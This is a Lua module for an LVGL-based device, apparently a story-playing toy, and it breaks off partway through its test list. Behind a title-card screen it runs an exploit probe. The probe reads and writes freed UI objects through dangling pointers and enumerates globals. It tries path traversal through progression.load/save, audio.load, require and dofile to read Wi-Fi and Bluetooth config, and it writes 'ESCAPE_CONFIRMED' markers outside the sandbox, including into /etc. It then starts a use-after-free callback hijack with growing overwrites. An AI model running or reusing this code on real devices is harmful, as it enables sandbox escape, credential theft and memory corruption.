---@class titleCard
local titleCard = {}
titleCard.styles = {}

titleCard.parentContainer = nil
titleCard.subtitleLabel = nil
titleCard.titleLabel = nil
titleCard.image = nil
titleCard.isAudioStarted = false
titleCard.opacityAnim = nil
titleCard.opacityAnimVar = nil
titleCard.translateAnim = nil
titleCard.translateAnimVar = nil
titleCard.closeAnim = nil
titleCard.closeAnimVar = nil
titleCard.callback = nil
titleCard.event_clicked_cb = nil
titleCard.img = nil

function titleCard.initSyles()
    titleCard.styles.parentContainer = lv.style.new()
    lv.style.set_bg_color(titleCard.styles.parentContainer, lv.color.hex(0x000000))
    lv.style.set_bg_opa(titleCard.styles.parentContainer, lv.OPA_COVER)
    lv.style.set_pad_top(titleCard.styles.parentContainer, 31)
    lv.style.set_pad_right(titleCard.styles.parentContainer, 0)
    lv.style.set_pad_bottom(titleCard.styles.parentContainer, 0)
    lv.style.set_pad_left(titleCard.styles.parentContainer, 16)

    titleCard.styles.subtitle = lv.style.new()
    lv.style.set_text_color(titleCard.styles.subtitle, lv.color.hex(0xffffff))
    lv.style.set_text_font(titleCard.styles.subtitle, lv.font.nunito_bold_12)
    lv.style.set_text_opa(titleCard.styles.subtitle, 0)

    titleCard.styles.title = lv.style.new()
    lv.style.set_text_color(titleCard.styles.title, lv.color.hex(0xffffff))
    lv.style.set_text_font(titleCard.styles.title, lv.font.nunito_extrabold_20)
    lv.style.set_text_line_space(titleCard.styles.title, 4)
    lv.style.set_translate_y(titleCard.styles.title, 7)
    lv.style.set_text_opa(titleCard.styles.title, 0)
end

function titleCard.text_opacity_transition(var, val)
    lv.style.set_text_opa(titleCard.styles.title, val)
    lv.obj.invalidate(titleCard.titleLabel)
    lv.style.set_text_opa(titleCard.styles.subtitle, val)
    lv.obj.invalidate(titleCard.subtitleLabel)
end

function titleCard.clean()
    lv.obj.remove_event_cb(titleCard.parentContainer,titleCard.event_clicked_cb)
    if (titleCard.opacityAnim ~= nil) then
        lv.anim_var.del(titleCard.opacityAnimVar)
        titleCard.opacityAnimVar = nil
        titleCard.opacityAnim = nil
    end
    if (titleCard.translateAnim ~= nil) then
        lv.anim_var.del(titleCard.translateAnimVar)
        titleCard.translateAnimVar = nil
        titleCard.translateAnim = nil
    end
    if (titleCard.closeAnim ~= nil) then
        lv.anim_var.del(titleCard.closeAnimVar)
        titleCard.closeAnimVar = nil
        titleCard.closeAnim = nil
    end
    lv.group.remove_all_objs(document)
    lv.obj.clean(window)
    for i, style in pairs(titleCard.styles) do
        lv.style.reset(style)
    end
    titleCard.img = nil
end

function titleCard.close_transition(_,val)
    if (val == 0) then
        titleCard.callback()
    else
        lv.style.set_text_opa(titleCard.styles.title, val)
        lv.obj.invalidate(titleCard.titleLabel)
        lv.style.set_text_opa(titleCard.styles.subtitle, val)
        lv.obj.invalidate(titleCard.subtitleLabel)
        lv.obj.set_style_img_opa(titleCard.image, val, lv.STATE_DEFAULT)
        lv.obj.invalidate(titleCard.image)
    end
end

function titleCard.translate_img(var, val)
    lv.obj.set_style_translate_x(titleCard.image, val, lv.STATE_DEFAULT)
    lv.obj.invalidate(titleCard.image)
end

function titleCard.audio_feedback(state, second)
    titleCard.isAudioStarted = true
    if (state == "stop") then
        titleCard.callback()
    end
end

function titleCard.on_encoder_clicked()
    if( titleCard.isAudioStarted) then
        Global.requestAudioStop(true)
    end
end

-- ============================================================================
--  Couleurs partagees
-- ============================================================================
local C_RED   = lv.color.hex(0xFF0000)
local C_GREEN = lv.color.hex(0x00FF41)
local C_AMBER = lv.color.hex(0xFFBF00)
local C_GREY  = lv.color.hex(0x888888)
local C_WHITE = lv.color.hex(0xCCCCCC)
local C_CYAN  = lv.color.hex(0x00FFFF)
local C_BG    = lv.color.hex(0x0a0a0a)

-- ============================================================================
--  Helper : bouton invisible plein ecran + navigation Enter
-- ============================================================================
local function _add_nav_button(parent, next_page_fn, page_label)
    local _nav_hint = lv.label.new(parent)
    lv.label.set_text(_nav_hint, "[Entree >> " .. page_label .. "]")
    lv.obj.set_style_text_color(_nav_hint, C_GREY, 0)
    lv.obj.align(_nav_hint, lv.ALIGN_BOTTOM_RIGHT, -4, -4)

    local _nav_btn = lv.btn.new(parent)
    lv.obj.remove_style_all(_nav_btn)
    lv.obj.set_size(_nav_btn, 320, 212)
    lv.obj.set_pos(_nav_btn, 0, 0)
    lv.obj.set_style_bg_opa(_nav_btn, 0, 0)
    lv.group.add_obj(document, _nav_btn)
    lv.group.focus_obj(_nav_btn)

    local _clicked = false
    lv.obj.add_event_cb(_nav_btn, function()
        if _clicked then return end
        _clicked = true
        lv.group.remove_all_objs(document)
        next_page_fn()
    end, lv.EVENT_CLICKED)
end

-- Helper : fond noir
local function _setup_bg()
    lv.group.remove_all_objs(document)
    lv.obj.clean(window)
    local _bg = lv.style.new()
    lv.style.set_bg_color(_bg, C_BG)
    lv.style.set_bg_opa(_bg, lv.OPA_COVER)
    lv.obj.add_style(window, _bg, 0)
end

-- ============================================================================
--  PAGE 1 : UAF DIAGNOSTIC
-- ============================================================================
function titleCard.display(args)
    titleCard.callback = args.cb
    lv.obj.clean(window)
    lv.group.set_editing(document, false)
    lv.group.set_wrap(document, false)
    titleCard.initSyles()

    titleCard.parentContainer = require("v-container").create(window, 8, true)
    lv.obj.remove_style_all(titleCard.parentContainer)
    lv.obj.set_size(titleCard.parentContainer, lv.obj.get_width(window), lv.obj.get_height(window))
    lv.obj.set_flex_flow(titleCard.parentContainer, lv.FLEX_FLOW_COLUMN)
    lv.obj.add_style(titleCard.parentContainer, titleCard.styles.parentContainer, lv.STATE_DEFAULT)
    titleCard.event_clicked_cb = lv.obj.add_event_cb(titleCard.parentContainer, titleCard.on_encoder_clicked, lv.EVENT_CLICKED)

    local _spies = {}
    local _NUM = 0
    local function _plant_spy()
        _NUM = _NUM + 1
        local s = lv.label.new(titleCard.parentContainer)
        lv.label.set_text(s, ".")
        lv.obj.add_flag(s, lv.OBJ_FLAG_HIDDEN)
        lv.obj.del(s)
        _spies[_NUM] = s
    end

    _plant_spy()
    titleCard.subtitleLabel = lv.label.new(titleCard.parentContainer)
    lv.label.set_text(titleCard.subtitleLabel, args.subtitle)
    lv.obj.remove_style_all(titleCard.subtitleLabel)
    lv.obj.set_width(titleCard.subtitleLabel, 214)
    lv.obj.add_style(titleCard.subtitleLabel, titleCard.styles.subtitle, lv.STATE_DEFAULT)

    _plant_spy()
    titleCard.titleLabel = lv.label.new(titleCard.parentContainer)
    lv.label.set_text(titleCard.titleLabel, args.title)
    lv.obj.remove_style_all(titleCard.titleLabel)
    lv.obj.set_width(titleCard.titleLabel, 214)
    lv.obj.add_style(titleCard.titleLabel, titleCard.styles.title, lv.STATE_DEFAULT)

    local _leaked = {}
    for _i = 1, _NUM do
        local _ok, _txt = pcall(lv.label.get_text, _spies[_i])
        if _ok and _txt and _txt ~= "." then
            _leaked[#_leaked + 1] = _txt
        end
    end

    local _write_ok = false
    local _victim_before = args.subtitle
    local _victim_after = nil
    local _corrupt_text = "CORROMPU PAR UAF"
    local _wok = pcall(lv.label.set_text, _spies[1], _corrupt_text)
    if _wok then
        local _rok, _rtxt = pcall(lv.label.get_text, titleCard.subtitleLabel)
        if _rok then
            _victim_after = _rtxt
            _write_ok = (_rtxt == _corrupt_text)
        end
    end

    print("[EXFIL] ======================================")
    print("[EXFIL]  PHASE 1 : LECTURE VIA DANGLING POINTERS")
    for _i, _t in ipairs(_leaked) do
        print(string.format("[EXFIL]  [%02d] \"%s\"", _i, _t))
    end
    print(string.format("[EXFIL]  %d/%d valeurs lues", #_leaked, _NUM))
    print("[EXFIL]  PHASE 2 : ECRITURE VIA DANGLING POINTER")
    print(string.format("[EXFIL]  Victime avant : \"%s\"", _victim_before))
    print(string.format("[EXFIL]  Victime apres : \"%s\"", tostring(_victim_after)))
    if _write_ok then print("[EXFIL]  *** CORRUPTION CONFIRMEE ***") end
    print("[EXFIL] ======================================")

    _setup_bg()
    local _y = 2

    local _hdr = lv.label.new(window)
    lv.label.set_text(_hdr, "USE-AFTER-FREE")
    lv.obj.set_style_text_color(_hdr, C_RED, 0)
    lv.obj.set_style_text_font(_hdr, lv.font.nunito_extrabold_20, 0)
    lv.obj.align(_hdr, lv.ALIGN_TOP_MID, 0, _y)
    _y = _y + 24

    local _p1 = lv.label.new(window)
    lv.label.set_text(_p1, "1. LECTURE -- spy lit :")
    lv.obj.set_style_text_color(_p1, C_GREY, 0)
    lv.obj.align(_p1, lv.ALIGN_TOP_LEFT, 6, _y)
    _y = _y + 14

    for _i, _t in ipairs(_leaked) do
        local _line = lv.label.new(window)
        local _d = _t
        if #_d > 36 then _d = string.sub(_d, 1, 35) .. ".." end
        lv.label.set_text(_line, string.format("[%02d] %s", _i, _d))
        lv.obj.set_style_text_color(_line, C_GREEN, 0)
        lv.obj.align(_line, lv.ALIGN_TOP_LEFT, 6, _y)
        _y = _y + 16
    end
    _y = _y + 6

    local _p2 = lv.label.new(window)
    lv.label.set_text(_p2, "2. ECRITURE -- corruption via spy :")
    lv.obj.set_style_text_color(_p2, C_GREY, 0)
    lv.obj.align(_p2, lv.ALIGN_TOP_LEFT, 6, _y)
    _y = _y + 16

    local _wb = lv.label.new(window)
    lv.label.set_text(_wb, "Avant : \"" .. _victim_before .. "\"")
    lv.obj.set_style_text_color(_wb, C_WHITE, 0)
    lv.obj.align(_wb, lv.ALIGN_TOP_LEFT, 6, _y)
    _y = _y + 14

    local _wa = lv.label.new(window)
    lv.label.set_text(_wa, "Apres : \"" .. tostring(_victim_after) .. "\"")
    lv.obj.set_style_text_color(_wa, _write_ok and C_RED or C_WHITE, 0)
    lv.obj.align(_wa, lv.ALIGN_TOP_LEFT, 6, _y)
    _y = _y + 18

    local _v = lv.label.new(window)
    lv.label.set_text(_v, _write_ok and "CORRUPTION CONFIRMEE" or "Pas de corruption")
    lv.obj.set_style_text_color(_v, C_RED, 0)
    lv.obj.set_style_text_font(_v, lv.font.nunito_extrabold_20, 0)
    lv.obj.align(_v, lv.ALIGN_BOTTOM_MID, 0, -18)

    _add_nav_button(window, titleCard._show_page2, "PAGE 2")
    return
end

-- ============================================================================
--  PAGE 2+ : EXPLORATEUR _G PAGINE
-- ============================================================================
local _LUA_STDLIB = {
    "assert", "collectgarbage", "dofile", "error", "getmetatable",
    "ipairs", "load", "loadfile", "next", "pairs", "pcall", "print",
    "rawequal", "rawget", "rawlen", "rawset", "require", "select",
    "setmetatable", "tonumber", "tostring", "type", "warn", "xpcall",
    "coroutine", "debug", "io", "math", "os", "package", "string", "table", "utf8",
    "_G", "_VERSION", "arg",
    "lv", "window", "document", "titleCard",
    "back_callback", "Global", "screen",
}
local _IGNORE = {}
for _, k in ipairs(_LUA_STDLIB) do _IGNORE[k] = true end

local function _collect_globals()
    local entries = {}
    for k, v in pairs(_G) do
        local name = tostring(k)
        if not _IGNORE[name] then
            entries[#entries + 1] = { name = name, tp = type(v), val = v }
        end
    end
    table.sort(entries, function(a, b) return a.name < b.name end)
    return entries
end

local function _format_entry(e)
    local s = e.name .. " (" .. e.tp .. ")"
    if e.tp == "string" then
        local v = tostring(e.val)
        if #v > 20 then v = string.sub(v, 1, 19) .. ".." end
        s = s .. " = \"" .. v .. "\""
    elseif e.tp == "number" or e.tp == "boolean" then
        s = s .. " = " .. tostring(e.val)
    end
    return s
end

local function _type_color(tp)
    if tp == "function" then return C_GREEN
    elseif tp == "table" then return C_CYAN
    elseif tp == "userdata" then return C_AMBER
    elseif tp == "string" then return lv.color.hex(0xFF99FF)
    elseif tp == "number" or tp == "boolean" then return C_WHITE
    else return C_GREY end
end

local LINES_PER_PAGE = 14

function titleCard._show_globals_page(page_num, entries)
    _setup_bg()
    local total = #entries
    local total_pages = math.ceil(total / LINES_PER_PAGE)
    if total_pages < 1 then total_pages = 1 end
    if page_num > total_pages then page_num = total_pages end
    local start_idx = (page_num - 1) * LINES_PER_PAGE + 1
    local end_idx = math.min(start_idx + LINES_PER_PAGE - 1, total)

    local _hdr = lv.label.new(window)
    lv.label.set_text(_hdr, string.format("_G EXPLORER  %d/%d", page_num, total_pages))
    lv.obj.set_style_text_color(_hdr, C_RED, 0)
    lv.obj.set_style_text_font(_hdr, lv.font.nunito_extrabold_16, 0)
    lv.obj.align(_hdr, lv.ALIGN_TOP_MID, 0, 0)

    local _sub = lv.label.new(window)
    lv.label.set_text(_sub, string.format("%d non-standard globals", total))
    lv.obj.set_style_text_color(_sub, C_GREY, 0)
    lv.obj.align(_sub, lv.ALIGN_TOP_MID, 0, 16)

    local _y = 32
    for i = start_idx, end_idx do
        local e = entries[i]
        local txt = _format_entry(e)
        if #txt > 42 then txt = string.sub(txt, 1, 41) .. ".." end
        local lbl = lv.label.new(window)
        lv.label.set_text(lbl, txt)
        lv.obj.set_style_text_color(lbl, _type_color(e.tp), 0)
        lv.obj.align(lbl, lv.ALIGN_TOP_LEFT, 4, _y)
        _y = _y + 12
        print(string.format("[_G] %s", _format_entry(e)))
    end

    if page_num < total_pages then
        _add_nav_button(window, function()
            titleCard._show_globals_page(page_num + 1, entries)
        end, "PAGE " .. (page_num + 1))
    else
        _add_nav_button(window, function()
            titleCard._show_table_explorer(entries)
        end, "TABLES")
    end
end

function titleCard._show_page2()
    local entries = _collect_globals()
    print(string.format("[_G] Found %d non-standard globals", #entries))
    titleCard._show_globals_page(1, entries)
end

-- ============================================================================
--  EXPLORATION DES SOUS-TABLES
-- ============================================================================
function titleCard._show_table_explorer(entries)
    local tables = {}
    for _, e in ipairs(entries) do
        if e.tp == "table" then
            local keys = {}
            local ok, _ = pcall(function()
                for k, v in pairs(e.val) do
                    keys[#keys + 1] = { name = tostring(k), tp = type(v) }
                end
            end)
            if ok and #keys > 0 then
                table.sort(keys, function(a, b) return a.name < b.name end)
                tables[#tables + 1] = { name = e.name, keys = keys }
            end
        end
    end

    if #tables == 0 then
        _setup_bg()
        local lbl = lv.label.new(window)
        lv.label.set_text(lbl, "No sub-tables found")
        lv.obj.set_style_text_color(lbl, C_GREY, 0)
        lv.obj.align(lbl, lv.ALIGN_CENTER, 0, 0)
        _add_nav_button(window, function()
            titleCard._show_traversal_tests()
        end, "TRAVERSAL")
        return
    end

    local flat = {}
    for _, tbl in ipairs(tables) do
        flat[#flat + 1] = { text = "--- " .. tbl.name .. " ---", color = C_CYAN }
        for _, k in ipairs(tbl.keys) do
            local txt = "  " .. tbl.name .. "." .. k.name .. " (" .. k.tp .. ")"
            flat[#flat + 1] = { text = txt, color = _type_color(k.tp) }
            print(string.format("[TABLE] %s.%s (%s)", tbl.name, k.name, k.tp))
        end
    end
    titleCard._show_table_page(1, flat)
end

function titleCard._show_table_page(page_num, flat)
    _setup_bg()
    local total = #flat
    local total_pages = math.ceil(total / LINES_PER_PAGE)
    if total_pages < 1 then total_pages = 1 end
    if page_num > total_pages then page_num = total_pages end
    local start_idx = (page_num - 1) * LINES_PER_PAGE + 1
    local end_idx = math.min(start_idx + LINES_PER_PAGE - 1, total)

    local _hdr = lv.label.new(window)
    lv.label.set_text(_hdr, string.format("SUB-TABLES  %d/%d", page_num, total_pages))
    lv.obj.set_style_text_color(_hdr, C_RED, 0)
    lv.obj.set_style_text_font(_hdr, lv.font.nunito_extrabold_16, 0)
    lv.obj.align(_hdr, lv.ALIGN_TOP_MID, 0, 0)

    local _y = 20
    for i = start_idx, end_idx do
        local item = flat[i]
        local txt = item.text
        if #txt > 44 then txt = string.sub(txt, 1, 43) .. ".." end
        local lbl = lv.label.new(window)
        lv.label.set_text(lbl, txt)
        lv.obj.set_style_text_color(lbl, item.color, 0)
        lv.obj.align(lbl, lv.ALIGN_TOP_LEFT, 4, _y)
        _y = _y + 12
    end

    if page_num < total_pages then
        _add_nav_button(window, function()
            titleCard._show_table_page(page_num + 1, flat)
        end, "PAGE " .. (page_num + 1))
    else
        _add_nav_button(window, function()
            titleCard._show_traversal_tests()
        end, "TRAVERSAL")
    end
end

-- ============================================================================
--  PHASE 3 : PATH TRAVERSAL — MODE SEQUENTIEL AVEC TIMER
--  Chaque test s'affiche AVANT execution. Si le device reboot,
--  le dernier texte visible = le test qui a crashe.
-- ============================================================================

titleCard._trav_y = 0
titleCard._trav_num = 0
titleCard._trav_page = 0

-- Helper : formate le resultat d'un progression.load
local function _fmt_load(ok, result)
    if not ok then
        local err = tostring(result)
        if #err > 22 then err = string.sub(err, 1, 21) .. ".." end
        return C_AMBER, "ERR " .. err
    end
    local tp = type(result)
    if tp == "table" then
        local n = 0
        local preview = ""
        for k, v in pairs(result) do
            n = n + 1
            if n <= 2 then
                local kv = tostring(k) .. "=" .. tostring(v)
                if #kv > 12 then kv = string.sub(kv, 1, 11) .. ".." end
                preview = preview .. kv .. " "
            end
        end
        if n > 0 then
            return C_GREEN, "DATA " .. n .. "k " .. preview
        else
            return C_GREY, "EMPTY {}"
        end
    elseif tp == "string" then
        local p = result
        if #p > 18 then p = string.sub(p, 1, 17) .. ".." end
        return C_GREEN, "STR \"" .. p .. "\""
    else
        return C_AMBER, tostring(tp)
    end
end

function titleCard._show_traversal_tests()
    titleCard._trav_num = 0
    titleCard._trav_page = 0

    local marker = { audit = "traversal_test", ts = "2026" }

    -- Tous les tests : { desc, fn } ou { _hdr = "title" }
    local tests = {

        { _hdr = "LOAD TRAVERSAL" },

        { desc = "load(chaps) baseline", fn = function()
            return _fmt_load(pcall(progression.load, "chaps"))
        end },
        { desc = "load ../../etc/library/list", fn = function()
            return _fmt_load(pcall(progression.load, "../../etc/library/list"))
        end },
        { desc = "load ../../../etc/library/list", fn = function()
            return _fmt_load(pcall(progression.load, "../../../etc/library/list"))
        end },
        { desc = "load ../../etc/wifi/config", fn = function()
            return _fmt_load(pcall(progression.load, "../../etc/wifi/config"))
        end },
        { desc = "load ../../etc/bluetooth/cfg", fn = function()
            return _fmt_load(pcall(progression.load, "../../etc/bluetooth/config"))
        end },
        { desc = "load ../../etc/onboarding", fn = function()
            return _fmt_load(pcall(progression.load, "../../etc/onboarding/force_update"))
        end },
        { desc = "load ../../str/index", fn = function()
            return _fmt_load(pcall(progression.load, "../../str/index"))
        end },
        { desc = "load ../../tmp/test", fn = function()
            return _fmt_load(pcall(progression.load, "../../tmp/test"))
        end },

        { _hdr = "SAVE TRAVERSAL" },

        { desc = "save(test) baseline", fn = function()
            local ok, err = pcall(progression.save, "test", marker)
            return ok and C_GREEN or C_AMBER, ok and "WRITTEN" or tostring(err)
        end },
        { desc = "verify load(test)", fn = function()
            return _fmt_load(pcall(progression.load, "test"))
        end },
        { desc = "save ../../tmp/audit", fn = function()
            local ok, err = pcall(progression.save, "../../tmp/audit", marker)
            return ok and C_GREEN or C_AMBER, ok and "WRITTEN" or tostring(err)
        end },
        { desc = "verify ../../tmp/audit", fn = function()
            return _fmt_load(pcall(progression.load, "../../tmp/audit"))
        end },
        { desc = "save ../../str/audit", fn = function()
            local ok, err = pcall(progression.save, "../../str/audit", marker)
            return ok and C_GREEN or C_AMBER, ok and "WRITTEN" or tostring(err)
        end },
        { desc = "save ../../etc/audit", fn = function()
            local ok, err = pcall(progression.save, "../../etc/audit", marker)
            return ok and C_GREEN or C_AMBER, ok and "WRITTEN" or tostring(err)
        end },

        { _hdr = "AUDIO TRAVERSAL" },

        { desc = "audio ../../etc/library/list", fn = function()
            if type(audio) ~= "table" or type(audio.load) ~= "function" then
                return C_GREY, "audio.load nil"
            end
            local ok, err = pcall(audio.load, 1, "../../etc/library/list", nil)
            if ok then
                local sok, st = pcall(audio.get_status)
                pcall(audio.stop)
                return C_GREEN, "LOADED st=" .. (sok and tostring(st) or "?")
            end
            local e = tostring(err)
            if #e > 22 then e = string.sub(e, 1, 21) .. ".." end
            return C_AMBER, "ERR " .. e
        end },
        { desc = "audio ../../usr/0/lib.cache", fn = function()
            if type(audio) ~= "table" or type(audio.load) ~= "function" then
                return C_GREY, "audio.load nil"
            end
            local ok, err = pcall(audio.load, 1, "../../usr/0/library.cache", nil)
            if ok then
                local sok, st = pcall(audio.get_status)
                pcall(audio.stop)
                return C_GREEN, "LOADED st=" .. (sok and tostring(st) or "?")
            end
            local e = tostring(err)
            if #e > 22 then e = string.sub(e, 1, 21) .. ".." end
            return C_AMBER, "ERR " .. e
        end },

        { _hdr = "DEBUG / STATE" },

        { desc = "print_mem_stat()", fn = function()
            if type(print_mem_stat) ~= "function" then return C_GREY, "nil" end
            local ok, err = pcall(print_mem_stat)
            return ok and C_GREEN or C_AMBER, ok and "CALLED OK" or tostring(err)
        end },
        { desc = "break_gdb?", fn = function()
            if type(break_gdb) == "function" then return C_AMBER, "FOUND (skip)" end
            return C_GREY, "nil"
        end },
        { desc = "current_time()", fn = function()
            if type(current_time) ~= "function" then return C_GREY, "nil" end
            local ok, val = pcall(current_time)
            return ok and C_GREEN or C_AMBER, tostring(val)
        end },
        { desc = "state keys", fn = function()
            if type(state) ~= "table" then return C_GREY, "nil" end
            local n = 0
            local kl = {}
            for k, _ in pairs(state) do n = n + 1; kl[#kl + 1] = tostring(k) end
            table.sort(kl)
            local p = table.concat(kl, ",")
            if #p > 25 then p = string.sub(p, 1, 24) .. ".." end
            return C_WHITE, n .. "k: " .. p
        end },
        { desc = "state.vars", fn = function()
            if type(state) ~= "table" or type(state.vars) ~= "table" then
                return C_GREY, "nil"
            end
            local n = 0
            local kl = {}
            for k, v in pairs(state.vars) do
                n = n + 1
                kl[#kl + 1] = tostring(k) .. "=" .. tostring(v)
            end
            table.sort(kl)
            local p = table.concat(kl, ",")
            if #p > 25 then p = string.sub(p, 1, 24) .. ".." end
            return C_WHITE, n .. "v: " .. p
        end },

        -- ================================================================
        --  PHASE 4 : WRITE VERIFY — confirmer l'ecriture hors sandbox
        --  Strategie : ecrire un marqueur unique via traversal,
        --  puis relire via le MEME chemin. Si DATA revient = escape.
        --  Aussi : ecrire dans /str/{uuid}/script/ et tenter require()
        -- ================================================================
        { _hdr = "WRITE VERIFY" },

        -- W1 : write+read roundtrip via ../../tmp/
        { desc = "save ../../tmp/wv_marker", fn = function()
            local m = { wv = "ESCAPE_CONFIRMED", t = "2026" }
            local ok, err = pcall(progression.save, "../../tmp/wv_marker", m)
            return ok and C_GREEN or C_AMBER, ok and "WRITTEN" or tostring(err)
        end },
        { desc = "load ../../tmp/wv_marker", fn = function()
            return _fmt_load(pcall(progression.load, "../../tmp/wv_marker"))
        end },

        -- W2 : variante avec x/../../../tmp (force creation de sous-dir prog_x)
        { desc = "save x/../../../tmp/wv2", fn = function()
            local m = { wv2 = "ALT_PATH" }
            local ok, err = pcall(progression.save, "x/../../../tmp/wv2", m)
            return ok and C_GREEN or C_AMBER, ok and "WRITTEN" or tostring(err)
        end },
        { desc = "load x/../../../tmp/wv2", fn = function()
            return _fmt_load(pcall(progression.load, "x/../../../tmp/wv2"))
        end },

        -- W3 : ecriture dans un repertoire story existant
        -- UUID connu de l'inventaire device (Spider-Man = 635FC850)
        { desc = "save ../../../str/inject", fn = function()
            local m = { injected = true, by = "audit" }
            local ok, err = pcall(progression.save, "../../../str/inject_test", m)
            return ok and C_GREEN or C_AMBER, ok and "WRITTEN" or tostring(err)
        end },
        { desc = "load ../../../str/inject", fn = function()
            return _fmt_load(pcall(progression.load, "../../../str/inject_test"))
        end },

        -- W4 : ecriture dans /etc/ (critique)
        { desc = "save ../../../etc/audit_w", fn = function()
            local m = { etc_write = true }
            local ok, err = pcall(progression.save, "../../../etc/audit_write", m)
            return ok and C_GREEN or C_AMBER, ok and "WRITTEN" or tostring(err)
        end },
        { desc = "load ../../../etc/audit_w", fn = function()
            return _fmt_load(pcall(progression.load, "../../../etc/audit_write"))
        end },

        -- ================================================================
        --  PHASE 5 : READ PRIMITIVES — require() et erreurs info-leak
        --  require() charge des fichiers Lua depuis script/ :
        --    require("../../etc/X") -> script/../../etc/X.lua = /etc/X.lua
        --  Les messages d'erreur de pcall peuvent leaker des paths/contenus
        -- ================================================================
        { _hdr = "READ PRIMITIVES" },

        -- R1 : require() avec traversal — le vecteur le plus prometteur
        { desc = "require ../../etc/library/list", fn = function()
            local ok, result = pcall(require, "../../etc/library/list")
            if ok then
                local tp = type(result)
                if tp == "table" then
                    local n = 0
                    for _ in pairs(result) do n = n + 1 end
                    return C_GREEN, "LOADED table " .. n .. "k"
                elseif tp == "string" then
                    local p = result
                    if #p > 20 then p = string.sub(p, 1, 19) .. ".." end
                    return C_GREEN, "LOADED \"" .. p .. "\""
                else
                    return C_GREEN, "LOADED " .. tp
                end
            end
            -- Erreur : analyser le message pour info leak
            local emsg = tostring(result)
            -- Chercher des paths reels dans l'erreur
            local path_leak = string.match(emsg, "(/[%w_/%.%-]+)")
            if path_leak then
                if #path_leak > 20 then path_leak = string.sub(path_leak, 1, 19) .. ".." end
                return C_AMBER, "PATH:" .. path_leak
            end
            if #emsg > 28 then emsg = string.sub(emsg, 1, 27) .. ".." end
            return C_AMBER, emsg
        end },

        -- R2 : require vers wifi config
        { desc = "require ../../etc/wifi/cfg", fn = function()
            local ok, result = pcall(require, "../../etc/wifi/config")
            if ok then return C_GREEN, "LOADED " .. type(result) end
            local emsg = tostring(result)
            local path_leak = string.match(emsg, "(/[%w_/%.%-]+)")
            if path_leak then
                if #path_leak > 20 then path_leak = string.sub(path_leak, 1, 19) .. ".." end
                return C_AMBER, "PATH:" .. path_leak
            end
            if #emsg > 28 then emsg = string.sub(emsg, 1, 27) .. ".." end
            return C_AMBER, emsg
        end },

        -- R3 : require vers un main.lsf d'une autre histoire
        { desc = "require ../../str/*/main", fn = function()
            -- Tenter avec un UUID generique
            local ok, result = pcall(require, "../main")
            if ok then return C_GREEN, "LOADED " .. type(result) end
            local emsg = tostring(result)
            local path_leak = string.match(emsg, "(/[%w_/%.%-]+)")
            if path_leak then
                if #path_leak > 20 then path_leak = string.sub(path_leak, 1, 19) .. ".." end
                return C_AMBER, "PATH:" .. path_leak
            end
            if #emsg > 28 then emsg = string.sub(emsg, 1, 27) .. ".." end
            return C_AMBER, emsg
        end },

        -- R4 : Global.load_module — SKIP : appelle cleanCurrentModule
        -- qui detruit title-card.lua en cours d'execution = crash garanti
        { desc = "Global.load_module", fn = function()
            if type(Global) ~= "table" or type(Global.load_module) ~= "function" then
                return C_GREY, "nil"
            end
            return C_AMBER, "SKIP (kills running module)"
        end },

        -- R5 : Scan des fonctions _G avec path en argument
        -- On ne teste QUE les fonctions safe (pas les routeurs d'histoire)
        { desc = "scan safe _G fn(path)", fn = function()
            local test_path = "../../etc/library/list"
            -- Liste blanche de fonctions safe a tester
            local safe = { "current_time" }
            local leaks = {}
            for _, fname in ipairs(safe) do
                local fn = _G[fname]
                if type(fn) == "function" then
                    local ok, result = pcall(fn, test_path)
                    if ok and result ~= nil then
                        local rt = type(result)
                        if rt == "string" and #result > 2 then
                            leaks[#leaks + 1] = fname .. "=STR"
                        elseif rt == "table" then
                            local n = 0
                            for _ in pairs(result) do n = n + 1 end
                            if n > 0 then
                                leaks[#leaks + 1] = fname .. "=" .. n .. "k"
                            end
                        end
                    end
                end
            end
            if #leaks > 0 then
                local p = table.concat(leaks, ",")
                if #p > 28 then p = string.sub(p, 1, 27) .. ".." end
                return C_GREEN, #leaks .. " leaks: " .. p
            end
            return C_GREY, "0 leaks"
        end },

        -- R6 : dofile si present
        { desc = "dofile traversal", fn = function()
            if type(dofile) ~= "function" then return C_GREY, "nil" end
            local ok, result = pcall(dofile, "../../etc/library/list")
            if ok then return C_GREEN, "EXEC " .. type(result) end
            local emsg = tostring(result)
            if #emsg > 28 then emsg = string.sub(emsg, 1, 27) .. ".." end
            return C_AMBER, emsg
        end },

        -- ================================================================
        --  PHASE 7 : UAF CALLBACK HIJACK — overwrites progressifs
        -- ================================================================
        { _hdr = "UAF CALLBACK" },

        -- C1 : Setup — creer la cible et le spy
        { desc = "create target btn", fn = function()
            -- Creer un bouton avec callback
            titleCard._uaf_target = lv.btn.new(window)
            lv.obj.set_size(titleCard._uaf_target, 1, 1)
            lv.obj.set_pos(titleCard._uaf_target, -10, -10)  -- hors ecran
            titleCard._uaf_cb_called = false
            titleCard._uaf_target_cb = lv.obj.add_event_cb(titleCard._uaf_target, function()
                titleCard._uaf_cb_called = true
            end, lv.EVENT_CLICKED)
            return C_GREEN, "btn+cb created"
        end },

        -- C2 : Lire les metadonnees du bouton avant corruption
        { desc = "target addr pre-corrupt", fn = function()
            local addr = tostring(titleCard._uaf_target)
            local a = string.match(addr, "0[xX](%x+)") or addr
            return C_CYAN, "addr=0x" .. string.upper(a)
        end },

        -- C3 : Spy sur le prochain label — meme taille que lv_obj_t
        { desc = "plant spy on label", fn = function()
            local spy = lv.label.new(window)
            lv.label.set_text(spy, ".")
            lv.obj.add_flag(spy, lv.OBJ_FLAG_HIDDEN)
            lv.obj.del(spy)
            titleCard._uaf_spy = spy
            -- Creer un label victime qui reutilise le bloc
            titleCard._uaf_victim_lbl = lv.label.new(window)
            lv.label.set_text(titleCard._uaf_victim_lbl, "VICTIM_CALLBACK_TEST")
            lv.obj.add_flag(titleCard._uaf_victim_lbl, lv.OBJ_FLAG_HIDDEN)

            -- Verifier le reuse
            local ok, txt = pcall(lv.label.get_text, spy)
            if ok and txt == "VICTIM_CALLBACK_TEST" then
                return C_GREEN, "REUSE confirmed"
            elseif ok then
                return C_AMBER, "read=\"" .. tostring(txt) .. "\""
            else
                return C_AMBER, "read failed"
            end
        end },

        -- C4-C10 : Overwrites progressifs 8B -> 512B
        -- Chaque test ecrit un payload unique, verifie la stabilite,
        -- puis lit le contenu via le spy pour exfiltration
        { desc = "overwrite 8B", fn = function()
            local payload = string.rep("A", 8)
            local wok = pcall(lv.label.set_text, titleCard._uaf_spy, payload)
            if not wok then return C_RED, "CRASH 8B" end
            titleCard._uaf_max = 8
            return C_GREEN, "8B STABLE"
        end },
